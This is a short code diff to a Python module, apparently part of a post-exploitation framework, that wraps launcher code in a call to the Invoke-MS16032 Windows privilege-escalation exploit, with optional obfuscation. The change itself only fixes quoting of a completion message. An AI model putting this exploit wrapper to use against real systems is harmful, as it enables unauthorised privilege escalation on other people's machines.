@@ -110,7 +110,7 @@ class Module(object):
         launcherCode = launcherCode.replace("`", "``").replace("$", "`$").replace("\"","'")
         
         scriptEnd = 'Invoke-MS16032 -Command "' + launcherCode + '"'
-        scriptEnd += ';`nInvoke-MS16032 completed.'
+        scriptEnd += ';"`nInvoke-MS16032 completed."'
 
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
